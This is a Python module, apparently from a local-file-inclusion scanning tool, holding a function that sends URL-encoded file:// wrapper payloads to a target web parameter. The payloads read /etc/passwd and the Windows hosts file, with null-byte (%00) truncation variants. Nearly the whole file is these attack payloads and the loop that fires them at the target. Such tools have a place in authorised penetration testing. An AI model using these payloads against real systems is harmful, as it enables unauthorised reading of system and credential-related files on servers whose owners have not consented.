"""File"""
from src.utils.arguments import init_args
from src.httpreqs.request import prepareRequest
from src.httpreqs.request import REQUEST
from src.configs.config import proxies
from src.utils.colors import Colors


def test_file_trunc(url, post):
    """Test file trunc"""
    args  = init_args()
    if args['verbose']:
        print(Colors().blue("[i]") + " Testing with file wrapper...", flush = True)

    tests = []
    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd")
    tests.append("file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")

    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd%2500")
    tests.append("file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")

    for i, test in enumerate(tests):
        u, reqHeaders, postTest = prepareRequest(args['param'], test, url, post)
        _, br = REQUEST(u, reqHeaders, postTest, proxies, "LFI", "FILE")

        if not br:
            return

        if i == 1 and args['quick']:
            return

    return
